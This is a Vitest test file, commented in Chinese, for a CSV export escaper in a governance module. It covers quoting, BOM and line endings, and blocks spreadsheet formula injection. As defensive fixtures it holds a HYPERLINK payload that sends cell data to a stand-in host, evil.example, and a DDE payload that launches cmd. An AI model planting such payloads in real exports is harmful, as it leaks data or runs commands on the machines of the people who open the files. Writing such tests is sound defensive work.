import { describe, expect, it } from 'vitest';
import { cell, toCsv } from '../routes/governance.js';

/**
 * 导出 CSV 的转义。
 *
 * 两类问题，后果差别很大：
 *   结构转义错 → 表格错行，一眼能看出来
 *   公式注入   → 文件看着完全正常，管理员用 Excel 打开的瞬间执行攻击者的公式
 *
 * 后者是这组用例真正要守的东西。姓名与提额理由都是用户可控的自由文本，
 * 而导出文件的唯一用途就是给管理员用 Excel 打开。
 */

describe('CSV 结构转义', () => {
  it('普通值原样输出', () => {
    expect(cell('lixiao')).toBe('lixiao');
    expect(cell(123)).toBe('123');
  });

  it('null / undefined 变空串，不是字符串 "null"', () => {
    expect(cell(null)).toBe('');
    expect(cell(undefined)).toBe('');
  });

  it('含逗号、引号、换行的值要加引号并转义', () => {
    expect(cell('张三,李四')).toBe('"张三,李四"');
    expect(cell('他说"好"')).toBe('"他说""好"""');
    expect(cell('第一行\n第二行')).toBe('"第一行\n第二行"');
  });

  it('整表按 CRLF 分行，并带 BOM', () => {
    const csv = toCsv(['A', 'B'], [['1', '2']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);   // BOM，否则 Excel 中文列名乱码
    expect(csv).toContain('\r\n');
  });
});

describe('CSV 公式注入', () => {
  // Excel / Numbers / WPS 会把这些开头的单元格当公式执行
  it.each(['=', '+', '-', '@'])('以 %s 开头的值被前置单引号，退回纯文本', (prefix) => {
    expect(cell(`${prefix}1+1`)).toBe(`'${prefix}1+1`);
  });

  it('真实攻击载荷不会被原样写出', () => {
    // 把姓名改成这个，管理员一打开导出文件，整张表的数据就外传了
    const payload = '=HYPERLINK("http://evil.example/?d="&A1,"点我")';
    const out = cell(payload);
    expect(out.startsWith('=')).toBe(false);
    // 既要挡公式，又要保住原文——审计场景下不能把内容改没了
    expect(out).toContain('HYPERLINK');
  });

  it('制表符与回车开头也挡——有的实现会先剥前导空白再判首字符', () => {
    // 制表符在 CSV 里是普通字符，不触发加引号，只需前置单引号
    expect(cell('\t=1+1')).toBe(`'\t=1+1`);
    // 回车会拆行，所以除了前置单引号还要加引号包起来
    expect(cell('\r=1+1')).toBe(`"'\r=1+1"`);
  });

  it('DDE 型载荷同样被挡', () => {
    expect(cell('@SUM(1+9)*cmd|\'/c calc\'!A0').startsWith('@')).toBe(false);
  });

  it('负数这类正常数据被加了单引号——已知代价，不是缺陷', () => {
    // -5 会变成 '-5。数值列因此在 Excel 里成为文本。
    // 权衡后接受：这几张表是给人看的名单与日志，不做二次计算；
    // 而漏掉 - 开头就等于放行 -2+3+cmd|... 这类载荷。
    expect(cell('-5')).toBe("'-5");
  });
});
